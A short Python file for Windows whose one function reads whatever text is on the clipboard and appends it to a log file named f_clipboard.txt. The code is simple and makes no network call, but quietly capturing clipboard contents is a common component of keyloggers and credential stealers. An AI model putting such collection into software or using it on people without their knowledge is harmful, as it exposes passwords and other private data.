import win32clipboard  # Import the module for clipboard operations
import win32con  # Import constants from the module for clipboard operations

# Function to copy clipboard contents
def copy_clipboard(file_path):
    with open(f"{file_path}/f_clipboard.txt", "a") as f:
        try:
            win32clipboard.OpenClipboard()  # Open the clipboard for access
            if win32clipboard.IsClipboardFormatAvailable(win32con.CF_TEXT):
                # Check if text data is available in the clipboard
                pasted_data = win32clipboard.GetClipboardData(win32con.CF_TEXT)
                if pasted_data:
                    # If text data is available, decode it and write to file
                    pasted_data = pasted_data.decode("utf-8")
                    f.write(f"Clipboard Data:\n{pasted_data}\n")
                else:
                    # If clipboard is empty, write a message to file
                    f.write("Clipboard is empty\n")
            else:
                # If text data is not available, write a message to file
                f.write("Text data not available in clipboard\n")
        except win32clipboard.error as e:
            # If there is an error accessing the clipboard, write the error message to file
            f.write(f"Clipboard access error: {e}\n")
        finally:
            win32clipboard.CloseClipboard()  # Close the clipboard
